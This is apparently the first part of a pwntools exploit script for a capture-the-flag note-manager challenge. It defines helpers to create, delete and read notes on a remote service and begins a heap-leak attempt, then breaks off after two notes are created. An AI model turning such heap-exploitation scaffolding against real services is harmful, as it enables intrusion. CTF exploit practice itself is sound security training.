from pwn import *
import time

context.log_level = 'error'

def read_until_menu(p):
    try:
        data = b''
        while b'Exit' not in data:
            chunk = p.recv(timeout=1)
            if not chunk:
                break
            data += chunk
        return True
    except:
        return False

def create_note(p, size, content):
    try:
        time.sleep(0.5)
        p.sendline(b'1')
        time.sleep(0.5)
        p.sendline(b'0')
        time.sleep(0.5)
        p.sendline(str(size).encode())
        time.sleep(0.5)
        p.sendline(content)
        time.sleep(0.5)
        return read_until_menu(p)
    except:
        return False

def delete_note(p, idx):
    try:
        time.sleep(0.5)
        p.sendline(b'2')
        time.sleep(0.5)
        p.sendline(str(idx).encode())
        time.sleep(0.5)
        return read_until_menu(p)
    except:
        return False

def read_note(p, idx):
    try:
        time.sleep(0.5)
        p.sendline(b'3')
        time.sleep(0.5)
        p.sendline(str(idx).encode())
        time.sleep(1)
        data = p.recvall(timeout=2)
        return data
    except:
        return None

def attempt_heap_leak():
    try:
        p = remote('pwn.chal.csaw.io', 9999, level='error')
        time.sleep(1)

        # Wait for initial menu
        if not read_until_menu(p):
            return None

        # Create 3 notes
        if not create_note(p, 128, b'A'*120):
            return None
        if not create_note(p, 128, b'B'*120):
            return None
